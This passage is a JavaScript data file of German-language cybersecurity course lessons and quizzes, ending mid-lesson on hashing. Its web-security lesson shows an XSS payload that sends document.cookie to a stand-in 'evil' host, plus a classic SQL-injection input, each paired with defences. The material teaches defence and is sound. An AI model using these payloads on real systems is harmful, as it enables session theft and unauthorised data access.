/* CyberDojo – Kursinhalte. Reine Daten; von js/app.js gerendert.
   Jede Lektion ist HTML; Quizzes haben answer = Index der richtigen Option. */
window.COURSES = [
{
  id:"grundlagen", title:"Grundlagen der Cybersicherheit", icon:"🛡️", level:"Einsteiger",
  duration:"ca. 45 Min", tags:["Basics","Schutzziele","Bedrohungen"],
  summary:"Was Cybersicherheit bedeutet, wer angreift und wie – das Fundament für alle weiteren Kurse.",
  lessons:[
    {id:"was-ist", title:"Was ist Cybersicherheit?", subtitle:"Begriffe, Ziele, Alltag",
     html:`<p>Cybersicherheit (IT-Sicherheit) umfasst alle Maßnahmen, die Informationen, Systeme und Netzwerke vor unbefugtem Zugriff, Manipulation oder Ausfall schützen. Es geht nicht nur um „Hacker", sondern genauso um Fehlkonfigurationen, verlorene Laptops, unachtsame Mitarbeitende und veraltete Software.</p>
     <h3>Die drei Schutzziele (CIA-Triade)</h3>
     <ul>
       <li><strong>Vertraulichkeit (Confidentiality):</strong> Nur Berechtigte sehen die Daten. Beispiel: Verschlüsselung, Zugriffsrechte.</li>
       <li><strong>Integrität (Integrity):</strong> Daten sind korrekt und unverändert. Beispiel: Prüfsummen, Signaturen.</li>
       <li><strong>Verfügbarkeit (Availability):</strong> Systeme sind erreichbar, wenn man sie braucht. Beispiel: Backups, Schutz vor Überlastungsangriffen.</li>
     </ul>
     <div class="callout"><span class="tag">Merksatz</span><p>Ein Angriff verletzt meist genau eines dieser Ziele. Wer „CIA" im Kopf hat, erkennt schnell, <em>was</em> schiefgeht.</p></div>
     <h3>Warum betrifft das jeden?</h3>
     <p>Online-Banking, E-Mail, Fotos, Firmendaten – all das hängt an Passwörtern und Software, die angreifbar sind. Schon ein geknacktes E-Mail-Konto erlaubt oft, weitere Konten per „Passwort vergessen" zu übernehmen.</p>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Sicherheit = Vertraulichkeit + Integrität + Verfügbarkeit.</li>
       <li>Der Mensch ist genauso wichtig wie die Technik.</li>
       <li>Dein E-Mail-Konto ist der Generalschlüssel – schütze es besonders.</li>
     </ul></div>`},
    {id:"angreifer", title:"Wer greift an – und warum?", subtitle:"Angreifertypen & Motive",
     html:`<p>„Der Hacker im Kapuzenpulli" ist ein Klischee. In Wahrheit gibt es sehr unterschiedliche Akteure mit unterschiedlichen Motiven und Fähigkeiten.</p>
     <h3>Typische Angreifer</h3>
     <ul>
       <li><strong>Script-Kiddies:</strong> nutzen fertige Tools, wenig Know-how, oft aus Langeweile.</li>
       <li><strong>Cyberkriminelle:</strong> Geldmotiv – Ransomware, Betrug, Datenhandel. Heute hoch professionalisiert („Cybercrime-as-a-Service").</li>
       <li><strong>Innentäter:</strong> Mitarbeitende, die Rechte missbrauchen oder fahrlässig handeln.</li>
       <li><strong>Hacktivisten:</strong> politisch/ideologisch motiviert.</li>
       <li><strong>Staatliche Akteure (APT):</strong> hoch ausgestattet, Spionage/Sabotage, sehr geduldig.</li>
     </ul>
     <h3>Hüte: White, Grey, Black Hat</h3>
     <p><strong>White Hats</strong> testen mit Erlaubnis und melden Lücken (ethisches Hacking). <strong>Black Hats</strong> handeln illegal zum eigenen Vorteil. <strong>Grey Hats</strong> bewegen sich in der Grauzone.</p>
     <div class="callout warn"><span class="tag">Rechtlich</span><p>In Deutschland ist das Ausspähen/Abfangen von Daten (§§ 202a–202d StGB) strafbar – auch „nur zum Ausprobieren". Teste niemals fremde Systeme ohne schriftliche Erlaubnis.</p></div>`},
    {id:"angriffskette", title:"Wie ein Angriff abläuft", subtitle:"Die Cyber Kill Chain",
     html:`<p>Angriffe folgen meist einem Muster. Wer die Phasen kennt, kann an jeder Stelle unterbrechen – „Defense in Depth".</p>
     <h3>Die Phasen (vereinfacht)</h3>
     <ol>
       <li><strong>Aufklärung (Recon):</strong> Infos sammeln – Mitarbeitende auf LinkedIn, offene Ports, E-Mail-Adressen.</li>
       <li><strong>Erstzugang:</strong> Phishing-Mail, gestohlenes Passwort, Schwachstelle in Software.</li>
       <li><strong>Ausführung & Persistenz:</strong> Schadcode startet, richtet sich dauerhaft ein (Autostart, Konten).</li>
       <li><strong>Rechteausweitung (Privilege Escalation):</strong> vom normalen Nutzer zum Admin.</li>
       <li><strong>Seitwärtsbewegung (Lateral Movement):</strong> von einem PC zum nächsten im Netz.</li>
       <li><strong>Ziel erreichen:</strong> Daten stehlen, verschlüsseln (Ransomware), sabotieren.</li>
     </ol>
     <div class="callout"><span class="tag">Verteidigung</span><p>Jede Phase bietet Erkennungs- und Stopp-Punkte: Phishing-Filter, MFA, Patches, Netzsegmentierung, Monitoring. Es braucht nie „die eine" Mauer, sondern viele Schichten.</p></div>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Angriffe sind Prozesse, keine Einzelmomente.</li>
       <li>Früh erkennen ist billiger als spät reagieren.</li>
       <li>Mehrere Schutzschichten schlagen eine perfekte Einzelmaßnahme.</li>
     </ul></div>`}
  ],
  quiz:[
    {q:"Welche drei Ziele bilden die CIA-Triade?", options:["Kontrolle, Integrität, Anonymität","Vertraulichkeit, Integrität, Verfügbarkeit","Verschlüsselung, Firewall, Backup","Confidentiality, Identity, Access"], answer:1, explain:"CIA steht für Confidentiality (Vertraulichkeit), Integrity (Integrität) und Availability (Verfügbarkeit)."},
    {q:"Was kennzeichnet einen White-Hat-Hacker?", options:["Arbeitet nur nachts","Testet Systeme mit Erlaubnis und meldet Lücken","Verkauft gestohlene Daten","Nutzt ausschließlich fertige Tools"], answer:1, explain:"White Hats handeln legal und mit Zustimmung des Betreibers (ethisches Hacking)."},
    {q:"Warum ist das E-Mail-Konto besonders schützenswert?", options:["Es ist langsam","Über 'Passwort vergessen' lassen sich damit andere Konten übernehmen","Es verbraucht viel Speicher","Es ist immer verschlüsselt"], answer:1, explain:"Das E-Mail-Postfach ist oft der Wiederherstellungsweg für viele andere Dienste – ein Generalschlüssel."},
    {q:"Was bedeutet 'Lateral Movement'?", options:["Ein Angreifer bewegt sich im Netzwerk von System zu System","Daten werden verschlüsselt","Eine Firewall wird neu gestartet","Ein Passwort wird geändert"], answer:0, explain:"Nach dem Erstzugang breitet sich der Angreifer seitlich im Netz aus, um wertvollere Ziele zu erreichen."},
    {q:"Was beschreibt 'Defense in Depth' am besten?", options:["Eine besonders dicke Firewall","Mehrere gestaffelte Schutzschichten","Daten nur offline speichern","Ein sehr langes Passwort"], answer:1, explain:"Mehrere Schichten sorgen dafür, dass ein einzelner Fehler nicht gleich zum Totalschaden führt."}
  ]
},
{
  id:"phishing", title:"Phishing & Social Engineering", icon:"🎣", level:"Einsteiger",
  duration:"ca. 40 Min", tags:["Phishing","Betrug","Mensch"], lab:"phishing",
  summary:"Die häufigste Angriffsart zielt auf den Menschen. Lerne, Täuschungen zu erkennen – inkl. interaktiver Übung.",
  lessons:[
    {id:"social-eng", title:"Social Engineering verstehen", subtitle:"Der Mensch als Schwachstelle",
     html:`<p>Social Engineering ist die Kunst, Menschen zu Handlungen zu bewegen, die der Sicherheit schaden – ein Passwort verraten, einen Anhang öffnen, Geld überweisen. Statt Technik wird Psychologie gehackt.</p>
     <h3>Psychologische Hebel</h3>
     <ul>
       <li><strong>Autorität:</strong> „Hier spricht die IT/der Chef."</li>
       <li><strong>Dringlichkeit & Angst:</strong> „Ihr Konto wird in 24 h gesperrt!"</li>
       <li><strong>Hilfsbereitschaft:</strong> „Können Sie mir kurz aushelfen?"</li>
       <li><strong>Gier/Neugier:</strong> „Sie haben gewonnen", „Gehaltsliste.xlsx".</li>
       <li><strong>Soziale Bewährtheit:</strong> „Alle Kollegen machen das schon."</li>
     </ul>
     <div class="callout danger"><span class="tag">Achtung</span><p>Druck + Eile + ungewöhnliche Bitte = klassisches Alarmmuster. Echte Organisationen setzen dich selten unter Zeitdruck für sicherheitskritische Aktionen.</p></div>`},
    {id:"phishing-arten", title:"Phishing und seine Varianten", subtitle:"E-Mail, Spear, Smishing, Vishing",
     html:`<p>Phishing ist Social Engineering über Nachrichten. Varianten:</p>
     <ul>
       <li><strong>Massen-Phishing:</strong> breite, generische Mails („Sehr geehrter Kunde").</li>
       <li><strong>Spear-Phishing:</strong> gezielt, personalisiert, mit echten Details.</li>
       <li><strong>Whaling:</strong> zielt auf Führungskräfte.</li>
       <li><strong>Smishing:</strong> per SMS (z. B. „Paket konnte nicht zugestellt werden").</li>
       <li><strong>Vishing:</strong> per Telefonanruf (z. B. „Microsoft-Support").</li>
       <li><strong>Quishing:</strong> per QR-Code, der auf eine Fake-Seite führt.</li>
     </ul>
     <h3>Woran du Phishing erkennst</h3>
     <ul>
       <li>Absenderadresse genau prüfen (nicht nur den angezeigten Namen).</li>
       <li>Links <em>ansehen, nicht klicken</em>: Mauszeiger drüber (Desktop) zeigt das echte Ziel.</li>
       <li>Täuschende Domains: <code>paypa1.com</code>, <code>amazon-sicherheit.net</code>, <code>bank.de.login-xyz.ru</code>.</li>
       <li>Unerwartete Anhänge (.zip, .html, Office mit „Makros aktivieren").</li>
       <li>Allgemeine Anrede, Rechtschreibfehler – aber: gute Fälschungen haben die kaum noch.</li>
     </ul>
     <div class="callout"><span class="tag">Trick</span><p>Die echte Domain steht <strong>direkt links vom letzten Punkt vor dem ersten „/"</strong>. Bei <code>mail.google.com.evil.ru/login</code> ist die Domain <code>evil.ru</code> – nicht google.</p></div>`},
    {id:"reaktion", title:"Richtig reagieren", subtitle:"Vorbeugen, prüfen, melden",
     html:`<p>Niemand ist gegen Phishing immun – entscheidend ist das Verhalten.</p>
     <h3>Vor dem Klick</h3>
     <ul>
       <li>Im Zweifel: über einen <strong>bekannten, selbst eingegebenen</strong> Weg einloggen, nicht über den Link.</li>
       <li>Bei Zahlungen/Datenänderungen über einen zweiten Kanal rückfragen (Anruf an bekannte Nummer).</li>
       <li>MFA aktivieren – dann reicht ein gestohlenes Passwort oft nicht.</li>
     </ul>
     <h3>Wenn es passiert ist</h3>
     <ol>
       <li>Passwort sofort ändern (und überall, wo es wiederverwendet wurde).</li>
       <li>MFA prüfen/aktivieren, aktive Sitzungen abmelden.</li>
       <li>Melden: an die eigene IT/Sicherheitsstelle; Betrug auch an die Polizei.</li>
       <li>Keine Scham – schnelles Melden begrenzt den Schaden.</li>
     </ol>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Prüfe Absender und echtes Link-Ziel, nicht den angezeigten Text.</li>
       <li>Dringlichkeit ist ein Warnsignal, kein Grund zur Eile.</li>
       <li>MFA + Melden = der beste Schutz nach dem Klick.</li>
     </ul></div>
     <p><strong>Jetzt üben:</strong> Teste dein Auge im <a href="#/lab/phishing">Phishing-Erkennungs-Training</a>.</p>`}
  ],
  quiz:[
    {q:"Was ist das Kernprinzip von Social Engineering?", options:["Technische Lücken ausnutzen","Menschen psychologisch manipulieren","Passwörter per Brute Force knacken","Netzwerke überlasten"], answer:1, explain:"Social Engineering zielt auf den Menschen, nicht auf die Technik."},
    {q:"Welche Domain ist bei 'login.microsoft.com.sicherheit-xyz.ru/konto' die echte?", options:["microsoft.com","login.microsoft.com","sicherheit-xyz.ru","konto"], answer:2, explain:"Maßgeblich ist der Teil direkt vor dem ersten '/': hier sicherheit-xyz.ru."},
    {q:"Was ist Spear-Phishing?", options:["Phishing per QR-Code","Breite, generische Massenmails","Gezielte, personalisierte Angriffe auf bestimmte Personen","Ein Antiviren-Tool"], answer:2, explain:"Spear-Phishing ist maßgeschneidert und nutzt echte persönliche Details."},
    {q:"Eine Mail erzeugt starken Zeitdruck ('in 24 h gesperrt'). Was tun?", options:["Schnell auf den Link klicken, bevor es zu spät ist","Innehalten und über einen bekannten Weg selbst einloggen","Die Mail weiterleiten an Kollegen","Antworten und nach dem Passwort fragen"], answer:1, explain:"Künstliche Dringlichkeit ist ein Alarmsignal – nicht über den Link, sondern selbst einloggen."},
    {q:"Warum hilft MFA gegen Phishing-Folgen?", options:["Es verschlüsselt die Festplatte","Ein gestohlenes Passwort allein genügt dann oft nicht","Es blockiert alle E-Mails","Es macht Passwörter überflüssig"], answer:1, explain:"Mit einem zweiten Faktor reicht das erbeutete Passwort meist nicht für den Login."}
  ]
},
{
  id:"passwoerter", title:"Passwörter & Authentifizierung", icon:"🔑", level:"Einsteiger",
  duration:"ca. 35 Min", tags:["Passwörter","MFA","Passkeys"], lab:"password",
  summary:"Starke Zugänge statt '123456'. Passwortmanager, MFA und Passkeys richtig nutzen – inkl. Passwort-Analyse-Tool.",
  lessons:[
    {id:"starke-pw", title:"Was ein Passwort stark macht", subtitle:"Länge schlägt Komplexität",
     html:`<p>Angreifer probieren Passwörter nicht von Hand, sondern mit Milliarden Versuchen pro Sekunde (offline, gegen gestohlene Datenbanken). Entscheidend ist die <strong>Entropie</strong> – wie viele Möglichkeiten es gibt.</p>
     <h3>Länge ist König</h3>
     <p>Jedes zusätzliche Zeichen vervielfacht den Aufwand. Ein langes, aber merkbares Passwort schlägt ein kurzes, kryptisches:</p>
     <ul>
       <li><code>Tr0ub4dor&3</code> – kurz, schwer zu merken, relativ schnell knackbar.</li>
       <li><code>richtiger-pferd-batterie-heftklammer</code> – vier zufällige Wörter, leicht zu merken, extrem stark.</li>
     </ul>
     <div class="callout warn"><span class="tag">Falscher Mythos</span><p>Erzwungene Sonderzeichen und monatliches Wechseln bringen wenig und führen zu Mustern wie <code>Sommer2026!</code>. Moderne Empfehlungen (NIST, BSI): <strong>lang, einzigartig, nur bei Verdacht wechseln.</strong></p></div>
     <h3>Die drei goldenen Regeln</h3>
     <ol>
       <li><strong>Lang</strong> (mind. 12–16 Zeichen bzw. eine Passphrase).</li>
       <li><strong>Einzigartig</strong> pro Dienst – nie wiederverwenden.</li>
       <li><strong>Geheim</strong> – nie teilen, nie in Klartext speichern.</li>
     </ol>
     <p><strong>Jetzt testen:</strong> Prüfe eigene Beispiele im <a href="#/lab/password">Passwort-Stärke-Analyzer</a> (läuft lokal im Browser, nichts wird gesendet).</p>`},
    {id:"manager", title:"Passwortmanager", subtitle:"Ein starkes Passwort für alle",
     html:`<p>Niemand kann sich 100 einzigartige Passwörter merken. Die Lösung: ein <strong>Passwortmanager</strong>. Du merkst dir nur ein starkes Master-Passwort, der Manager erzeugt und speichert den Rest – verschlüsselt.</p>
     <h3>Vorteile</h3>
     <ul>
       <li>Für jeden Dienst ein langes, zufälliges, einzigartiges Passwort.</li>
       <li>Automatisches Ausfüllen nur auf der <em>echten</em> Domain → Phishing-Schutz.</li>
       <li>Warnungen bei geleakten oder doppelten Passwörtern.</li>
     </ul>
     <h3>Bekannte Optionen</h3>
     <p>Bitwarden und KeePassXC (beide Open Source), 1Password, oder die in Browser/Betriebssystem integrierten Manager. Wichtiger als das Produkt: dass du <em>überhaupt</em> einen nutzt und das Master-Passwort stark ist.</p>
     <div class="callout"><span class="tag">Tipp</span><p>Sichere das Master-Passwort zusätzlich mit MFA ab und notiere einen Wiederherstellungscode an einem sicheren, physischen Ort.</p></div>`},
    {id:"mfa", title:"MFA und Passkeys", subtitle:"Mehr als nur ein Faktor",
     html:`<p>Ein Faktor allein (Wissen = Passwort) ist angreifbar. <strong>Multi-Faktor-Authentifizierung (MFA)</strong> kombiniert mehrere unabhängige Faktoren:</p>
     <ul>
       <li><strong>Wissen</strong> – etwas, das du weißt (Passwort, PIN).</li>
       <li><strong>Besitz</strong> – etwas, das du hast (Handy-App, Sicherheitsschlüssel).</li>
       <li><strong>Inhärenz</strong> – etwas, das du bist (Fingerabdruck, Gesicht).</li>
     </ul>
     <h3>Welche MFA ist gut?</h3>
     <ol>
       <li><strong>Sicherheitsschlüssel / Passkeys (FIDO2):</strong> am stärksten, phishing-resistent.</li>
       <li><strong>Authenticator-App (TOTP):</strong> gut, besser als SMS.</li>
       <li><strong>SMS-Code:</strong> besser als nichts, aber durch SIM-Swapping angreifbar.</li>
     </ol>
     <h3>Passkeys – die Zukunft</h3>
     <p>Passkeys ersetzen das Passwort durch ein Schlüsselpaar auf deinem Gerät. Es gibt kein Geheimnis, das abgephisht oder geleakt werden kann – du bestätigst per Fingerabdruck/Gesicht. Immer mehr Dienste unterstützen sie.</p>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Passwortmanager + einzigartige Passwörter = Grundschutz.</li>
       <li>MFA überall aktivieren, wo es geht – am besten App oder Schlüssel statt SMS.</li>
       <li>Passkeys sind phishing-resistent und lösen das Passwort langfristig ab.</li>
     </ul></div>`}
  ],
  quiz:[
    {q:"Was erhöht die Passwortstärke am stärksten?", options:["Ein Ausrufezeichen am Ende","Mehr Länge","Monatlicher Wechsel","Großbuchstabe am Anfang"], answer:1, explain:"Länge/Entropie dominiert – jedes Zeichen vervielfacht die Möglichkeiten."},
    {q:"Warum sind Passwortmanager auch ein Phishing-Schutz?", options:["Sie blockieren E-Mails","Sie füllen Zugangsdaten nur auf der echten Domain aus","Sie verschlüsseln den Browser","Sie ändern Passwörter automatisch täglich"], answer:1, explain:"Da der Manager die Domain prüft, füllt er auf einer Fake-Seite nichts aus – ein deutliches Warnsignal."},
    {q:"Welche MFA-Methode gilt als am sichersten?", options:["SMS-Code","E-Mail-Code","Sicherheitsschlüssel/Passkey (FIDO2)","Sicherheitsfrage"], answer:2, explain:"FIDO2/Passkeys sind phishing-resistent, weil kein abgreifbares Geheimnis übertragen wird."},
    {q:"Welche Passwort-Strategie ist heute empfohlen?", options:["Kurz, dafür viele Sonderzeichen","Überall dasselbe, aber kompliziert","Lang, einzigartig pro Dienst, nur bei Verdacht wechseln","Monatlich ein Zeichen anhängen"], answer:2, explain:"Aktuelle Empfehlungen (BSI/NIST): lang, einzigartig, kein Zwangswechsel ohne Anlass."},
    {q:"Was ist ein Risiko von SMS-basierter MFA?", options:["Zu lange Codes","SIM-Swapping","Zu starke Verschlüsselung","Keine Internetverbindung nötig"], answer:1, explain:"Beim SIM-Swapping übernimmt ein Angreifer die Rufnummer und fängt die Codes ab."}
  ]
},
{
  id:"netzwerk", title:"Netzwerksicherheit", icon:"🌐", level:"Fortgeschritten",
  duration:"ca. 50 Min", tags:["Netzwerk","Firewall","WLAN","VPN"],
  summary:"Wie Daten durchs Netz reisen, wo sie angreifbar sind und wie Firewalls, VPN und sicheres WLAN schützen.",
  lessons:[
    {id:"grundlagen-net", title:"Netzwerk-Grundlagen", subtitle:"IP, Ports, TCP/IP",
     html:`<p>Geräte im Netz haben eine <strong>IP-Adresse</strong> (z. B. <code>192.168.1.10</code>). Dienste laufen auf <strong>Ports</strong> – wie Türen an einem Haus mit einer Adresse.</p>
     <h3>Wichtige Ports</h3>
     <ul>
       <li><code>80</code> HTTP, <code>443</code> HTTPS (verschlüsselt)</li>
       <li><code>22</code> SSH (Fernzugriff), <code>3389</code> RDP (Windows-Fernzugriff)</li>
       <li><code>53</code> DNS (Namensauflösung), <code>25/587</code> E-Mail</li>
     </ul>
     <p>Beim Verbindungsaufbau (TCP) gibt es einen „Drei-Wege-Handschlag": SYN → SYN/ACK → ACK. <strong>DNS</strong> übersetzt Namen wie <code>example.com</code> in IP-Adressen – ein beliebtes Angriffsziel (DNS-Spoofing).</p>
     <div class="callout"><span class="tag">Sicherheitsblick</span><p>Jeder offene Port ist eine mögliche Tür. Grundregel: <strong>nur öffnen, was wirklich gebraucht wird</strong>, und offene Dienste aktuell halten.</p></div>`},
    {id:"firewall", title:"Firewalls & Segmentierung", subtitle:"Türsteher fürs Netz",
     html:`<p>Eine <strong>Firewall</strong> entscheidet nach Regeln, welcher Verkehr durchdarf (Quelle, Ziel, Port, Protokoll). Grundhaltung: <em>„Alles verbieten, nur Nötiges erlauben"</em> (Default Deny).</p>
     <h3>Arten</h3>
     <ul>
       <li><strong>Paketfilter:</strong> prüft Adressen/Ports.</li>
       <li><strong>Stateful:</strong> merkt sich Verbindungszustände.</li>
       <li><strong>Next-Gen (NGFW):</strong> erkennt Anwendungen und Inhalte.</li>
     </ul>
     <h3>Segmentierung</h3>
     <p>Netze in Zonen aufteilen (z. B. Gäste-WLAN getrennt vom Firmennetz, Produktion getrennt vom Büro). So kann sich ein Angreifer nach einem Einbruch nicht frei ausbreiten (begrenzt „Lateral Movement").</p>
     <div class="callout warn"><span class="tag">Praxis</span><p>Auch dein Heim-Router hat eine Firewall. Aktiviere das Gäste-WLAN für Besuch und smarte Geräte – so bleiben Laptop & NAS getrennt.</p></div>`},
    {id:"wlan-vpn", title:"WLAN & VPN", subtitle:"Sicher unterwegs",
     html:`<p>Funk ist abhörbar. Deshalb muss WLAN <strong>verschlüsselt</strong> sein.</p>
     <h3>WLAN absichern</h3>
     <ul>
       <li><strong>WPA3</strong> (oder mindestens WPA2) verwenden, nie „offen" oder WEP.</li>
       <li>Langes WLAN-Passwort; Router-Admin-Passwort ändern.</li>
       <li>WPS deaktivieren; Firmware aktuell halten.</li>
     </ul>
     <h3>Öffentliche Netze & VPN</h3>
     <p>In offenen Netzen (Café, Flughafen) kann Verkehr mitgelesen werden. Ein <strong>VPN</strong> baut einen verschlüsselten Tunnel auf – dein Verkehr ist so auch im fremden Netz geschützt. Dank flächendeckendem HTTPS ist Web-Verkehr heute ohnehin verschlüsselt, aber ein VPN schützt zusätzlich Metadaten und ungesicherte Apps.</p>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Offene Ports minimieren, Dienste patchen.</li>
       <li>Firewall mit „Default Deny" + Netze segmentieren.</li>
       <li>WPA3/WPA2 im WLAN, VPN in fremden Netzen.</li>
     </ul></div>`}
  ],
  quiz:[
    {q:"Auf welchem Port läuft HTTPS standardmäßig?", options:["80","22","443","3389"], answer:2, explain:"443 ist HTTPS (verschlüsselt); 80 ist unverschlüsseltes HTTP."},
    {q:"Was beschreibt 'Default Deny' bei Firewalls?", options:["Alles erlauben, Bekanntes sperren","Alles sperren, nur Nötiges erlauben","Nur nachts filtern","Nur eingehenden Verkehr prüfen"], answer:1, explain:"Grundhaltung: standardmäßig blockieren und gezielt nur Benötigtes freigeben."},
    {q:"Wozu dient Netzwerksegmentierung?", options:["Höhere Internetgeschwindigkeit","Angreifer an der Ausbreitung hindern","Passwörter speichern","DNS beschleunigen"], answer:1, explain:"Getrennte Zonen begrenzen Lateral Movement nach einem Einbruch."},
    {q:"Welche WLAN-Verschlüsselung sollte man NICHT nutzen?", options:["WPA3","WPA2","WEP","—"], answer:2, explain:"WEP ist veraltet und in Minuten knackbar; WPA2/WPA3 verwenden."},
    {q:"Was leistet ein VPN in einem offenen Café-WLAN?", options:["Es macht das WLAN schneller","Es verschlüsselt deinen Verkehr durch einen Tunnel","Es ersetzt dein Passwort","Es blockiert alle Webseiten"], answer:1, explain:"Das VPN tunnelt und verschlüsselt den Verkehr, sodass das fremde Netz ihn nicht mitlesen kann."}
  ]
},
{
  id:"websec", title:"Web-Sicherheit & OWASP Top 10", icon:"🕸️", level:"Fortgeschritten",
  duration:"ca. 55 Min", tags:["Web","OWASP","XSS","SQLi"],
  summary:"Die häufigsten Schwachstellen in Webanwendungen verstehen – mit sicheren Beispielen und Gegenmaßnahmen.",
  lessons:[
    {id:"owasp", title:"OWASP Top 10 im Überblick", subtitle:"Die wichtigsten Risiken",
     html:`<p>Die <strong>OWASP Top 10</strong> sind die bekannteste Liste der kritischsten Risiken für Webanwendungen. Auszug (2021):</p>
     <ul>
       <li><strong>A01 Broken Access Control:</strong> Nutzer sehen/tun Dinge, die ihnen nicht erlaubt sind.</li>
       <li><strong>A02 Kryptografie-Fehler:</strong> schwache/fehlende Verschlüsselung.</li>
       <li><strong>A03 Injection:</strong> z. B. SQL-Injection, Befehls-Injection.</li>
       <li><strong>A05 Sicherheits-Fehlkonfiguration.</strong></li>
       <li><strong>A07 Identifikations-/Authentifizierungsfehler.</strong></li>
     </ul>
     <div class="callout"><span class="tag">Grundprinzip</span><p><strong>„Never trust user input."</strong> Jede Eingabe – Formulare, URLs, Header, Dateinamen – kann bösartig sein und muss geprüft werden.</p></div>`},
    {id:"xss", title:"Cross-Site Scripting (XSS)", subtitle:"Fremder Code im Browser des Opfers",
     html:`<p>Bei <strong>XSS</strong> schleust ein Angreifer JavaScript in eine Seite, das im Browser anderer Nutzer ausgeführt wird – z. B. um Sitzungs-Cookies zu stehlen.</p>
     <h3>Beispiel (verwundbar)</h3>
     <pre><code>// Server gibt ungeprüft aus:
Hallo &lt;?= $_GET['name'] ?&gt;!

// Angreifer-URL:
?name=&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;</code></pre>
     <h3>Schutz</h3>
     <ul>
       <li><strong>Output-Encoding:</strong> Ausgaben kontextabhängig escapen (HTML, Attribut, JS).</li>
       <li><strong>Content-Security-Policy (CSP):</strong> erlaubt nur vertrauenswürdige Skriptquellen.</li>
       <li>Moderne Frameworks (React, Angular) escapen standardmäßig – nicht umgehen (<code>dangerouslySetInnerHTML</code> meiden).</li>
     </ul>
     <div class="callout danger"><span class="tag">Nur zu Demozwecken</span><p>Teste XSS ausschließlich auf eigenen Übungsumgebungen wie <em>OWASP Juice Shop</em> oder <em>DVWA</em> – niemals auf fremden Seiten.</p></div>`},
    {id:"sqli", title:"SQL-Injection & sichere Queries", subtitle:"Wenn Eingaben zu Befehlen werden",
     html:`<p>Bei <strong>SQL-Injection</strong> wird Nutzereingabe direkt in eine Datenbankabfrage eingebaut und verändert deren Logik.</p>
     <h3>Verwundbar</h3>
     <pre><code>query = "SELECT * FROM users WHERE name='" + input + "'";
// input:  ' OR '1'='1
// Ergebnis: Bedingung immer wahr → alle Datensätze</code></pre>
     <h3>Richtig: Prepared Statements</h3>
     <pre><code>// Platzhalter statt String-Verkettung
stmt = db.prepare("SELECT * FROM users WHERE name = ?");
stmt.execute([input]);   // Eingabe bleibt Daten, wird nie Code</code></pre>
     <h3>Weitere Maßnahmen</h3>
     <ul>
       <li>Eingaben validieren (Typ, Länge, Format).</li>
       <li>Least Privilege für den DB-Benutzer.</li>
       <li>Fehlermeldungen nicht nach außen geben (keine Query-Details).</li>
     </ul>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Niemals Eingaben vertrauen – validieren und kontextgerecht escapen.</li>
       <li>XSS → Output-Encoding + CSP; SQLi → Prepared Statements.</li>
       <li>Übe Angriffe nur in legalen Trainingsumgebungen.</li>
     </ul></div>`}
  ],
  quiz:[
    {q:"Was ist das Grundprinzip sicherer Web-Entwicklung?", options:["Schnell deployen","Never trust user input","Immer Admin-Rechte nutzen","Fehler ausführlich anzeigen"], answer:1, explain:"Jede Eingabe kann bösartig sein und muss geprüft/escaped werden."},
    {q:"Wie verhindert man SQL-Injection zuverlässig?", options:["Eingaben in Großbuchstaben umwandeln","Prepared Statements / parametrisierte Queries","Die Datenbank neu starten","Längere Passwörter"], answer:1, explain:"Parametrisierte Queries trennen Code von Daten – Eingaben werden nie als Befehl interpretiert."},
    {q:"Wogegen hilft eine Content-Security-Policy (CSP) vor allem?", options:["SQL-Injection","XSS","Phishing-Mails","WLAN-Angriffe"], answer:1, explain:"CSP schränkt erlaubte Skriptquellen ein und erschwert XSS erheblich."},
    {q:"Was bedeutet 'Broken Access Control' (A01)?", options:["Ein kaputter Login-Button","Nutzer können auf Dinge zugreifen, die ihnen nicht erlaubt sind","Zu viele Passwörter","Langsame Datenbank"], answer:1, explain:"Fehlende/fehlerhafte Rechteprüfung lässt unbefugte Aktionen zu."},
    {q:"Wo sollte man XSS/SQLi legal üben?", options:["Auf der Website der eigenen Bank","Auf beliebigen fremden Seiten","In Trainingsumgebungen wie Juice Shop/DVWA","Im E-Mail-Postfach"], answer:2, explain:"Nur in dafür vorgesehenen, eigenen Übungsumgebungen – alles andere ist illegal."}
  ]
},
{
  id:"krypto", title:"Kryptographie-Grundlagen", icon:"🔐", level:"Fortgeschritten",
  duration:"ca. 45 Min", tags:["Verschlüsselung","Hashing","PKI"], lab:"crypto",
  summary:"Verschlüsselung, Hashing und digitale Signaturen verständlich – mit Spielwiese zum Ausprobieren.",
  lessons:[
    {id:"sym-asym", title:"Symmetrisch vs. asymmetrisch", subtitle:"Ein Schlüssel oder zwei?",
     html:`<p>Verschlüsselung macht Daten für Unbefugte unlesbar. Zwei Grundfamilien:</p>
     <h3>Symmetrisch</h3>
     <p>Ein <strong>geheimer Schlüssel</strong> ver- und entschlüsselt (z. B. <strong>AES</strong>). Sehr schnell. Problem: Wie tauscht man den Schlüssel sicher aus?</p>
     <h3>Asymmetrisch</h3>
     <p>Ein <strong>Schlüsselpaar</strong>: ein <em>öffentlicher</em> Schlüssel verschlüsselt, der <em>private</em> entschlüsselt (z. B. <strong>RSA</strong>, <strong>ECC</strong>). Löst den Schlüsseltausch, ist aber langsamer.</p>
     <div class="callout"><span class="tag">In der Praxis</span><p>HTTPS/TLS kombiniert beides: asymmetrisch, um sicher einen symmetrischen Sitzungsschlüssel auszuhandeln – danach schnelle symmetrische Verschlüsselung.</p></div>`},
    {id:"hashing", title:"Hashing", subtitle:"Fingerabdrücke für Daten",
     html:`<p>Ein <strong>Hash</strong> ist eine Einwegfunktion: Aus beliebigen Daten entsteht ein fester, kurzer Wert (Fingerabdruck). Man kann nicht zurückrechnen, und schon ein geändertes Bit ändert den Hash komplett.</p>
     <h3>Eigenschaften</h3>
     <ul>
       <li><strong>Deterministisch:</strong> gleiche Eingabe → gleicher Hash.</li>
       <li><strong>Kollisionsresistent:</strong> praktisch keine zwei Eingaben mit gleichem Hash.</li>
       <li><strong>Einweg:</strong> aus dem Hash lässt sich die Eingabe nicht herstellen.</li>
     </ul>
     <p>Gute Algorithmen: <strong>SHA-256</strong>. Veraltet/unsicher: MD5, SHA-1.</p>
     <h3>Passwörter richtig hashen</h3>
